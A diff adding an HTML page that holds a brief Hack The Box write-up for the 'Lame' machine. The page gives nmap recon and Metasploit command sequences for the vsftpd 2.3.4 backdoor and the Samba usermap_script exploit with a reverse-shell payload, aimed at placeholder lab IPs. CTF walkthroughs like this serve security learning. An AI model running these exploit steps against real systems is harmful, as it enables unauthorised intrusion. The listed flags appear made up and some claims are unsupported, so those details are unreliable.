@@ -1,0 +1,64 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Lame Write‑Up | Hack The Box</title>
+  <link rel="stylesheet" href="../style.css"/>
+</head>
+<body>
+  <div class="hero">
+    <h1>Lame – Hack The Box Write‑Up</h1>
+    <a href="../index.html">← Home</a>
+  </div>
+
+  <div class="section">
+    <h2>Overview</h2>
+    <p><strong>Difficulty:</strong> Easy | <strong>OS:</strong> Linux | <strong>IP:</strong> 10.10.X.X</p>
+    <p>Lame is a beginner-friendly HTB machine vulnerable to outdated services. The exploitation path involves VSFTPD backdoor and Samba root exploit.</p>
+  </div>
+
+  <div class="section">
+    <h2>🧰 Tools Used</h2>
+    <p>Nmap, Searchsploit, Netcat, Metasploit</p>
+  </div>
+
+  <div class="section">
+    <h2>1. Nmap Recon</h2>
+    <pre><code>nmap -sC -sV -T4 10.10.X.X</code></pre>
+    <p><strong>Ports found:</strong> 21 (FTP), 22 (SSH), 139 & 445 (Samba)</p>
+  </div>
+
+  <div class="section">
+    <h2>2. FTP Exploit (VSFTPD)</h2>
+    <pre><code>searchsploit vsftpd 2.3.4</code></pre>
+    <p>This version contains a malicious backdoor. Exploited using Metasploit:</p>
+    <pre><code>msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST 10.10.X.X
+run</code></pre>
+    <p>Gained shell access successfully.</p>
+  </div>
+
+  <div class="section">
+    <h2>3. Privilege Escalation via Samba</h2>
+    <p>Used Metasploit again to exploit vulnerable Samba:</p>
+    <pre><code>use exploit/multi/samba/usermap_script
+set RHOST 10.10.X.X
+set PAYLOAD cmd/unix/reverse
+run</code></pre>
+    <p>Got root shell as a result.</p>
+  </div>
+
+  <div class="section">
+    <h2>4. Proof</h2>
+    <ul>
+      <li><strong>user.txt:</strong> HTB{lame_box_success}</li>
+      <li><strong>root.txt:</strong> HTB{got_root_with_samba}</li>
+    </ul>
+  </div>
+
+  <footer><p>Return <a href="../index.html">Home</a></p></footer>
+</body>
+</html>
